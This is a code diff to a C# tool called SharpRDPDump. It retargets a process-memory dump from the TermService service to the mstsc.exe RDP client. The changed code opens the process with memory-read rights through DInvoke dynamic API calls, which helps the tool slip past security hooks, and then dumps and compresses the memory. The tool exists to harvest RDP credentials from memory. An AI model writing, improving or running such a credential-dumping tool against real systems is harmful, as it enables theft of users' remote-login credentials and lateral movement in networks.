@@ -2,7 +2,6 @@
 using System.Diagnostics;
 using System.IO;
 using System.IO.Compression;
-using System.Management;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 using DInvoke.DynamicInvoke;
@@ -55,25 +54,6 @@ namespace SharpRDPDump
             return principal.IsInRole(WindowsBuiltInRole.Administrator);
         }
 
-        public static int GetTermServicePid()
-        {
-            int pid = 0;
-            ManagementObjectSearcher mgmtObjSearcher = new ManagementObjectSearcher("SELECT ProcessId FROM Win32_service WHERE name = \'TermService\'");
-            ManagementObjectCollection eventlogCollectors = mgmtObjSearcher.Get();
-            //long live IEnumerables...
-            if (eventlogCollectors.Count != 1)
-            {
-                throw new Exception("there should only be one termservice on the system");
-            }
-            foreach (ManagementObject eventlogcollector in eventlogCollectors)
-            {
-                object o = eventlogcollector["ProcessId"];
-                pid = Convert.ToInt32(o);
-                //pid = Convert.ToUInt32((uint)eventlogcollector["ProcessId"]);
-            }
-            Console.WriteLine("termservice found, PID: " + pid);
-            return pid;
-        }
         public static void Compress(string inFile, string outFile)
         {
             try
@@ -106,8 +86,13 @@ namespace SharpRDPDump
                 throw new Exception("you need to specify a location to write the dump to.");
             }
 
-            uint targetProcessId = (uint)GetTermServicePid();
-            object[] openProcParams = { DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, false, targetProcessId };
+            uint targetProcessId = (uint)Process.GetProcessesByName("mstsc")[0].Id;
+            if (targetProcessId == 0)
+            {
+                throw new Exception("mstsc.exe does not seem to be running.");
+            }
+            Console.WriteLine("mstsc found! dumping PID:" + targetProcessId);
+            object[] openProcParams = { DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_INFORMATION | DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_VM_READ, false, targetProcessId };
             IntPtr targetProcessHandle = (IntPtr)Generic.DynamicAPIInvoke("kernel32.dll", "OpenProcess", typeof(Win32.Delegates.OpenProcess), ref openProcParams);
             bool bRet = false;
 
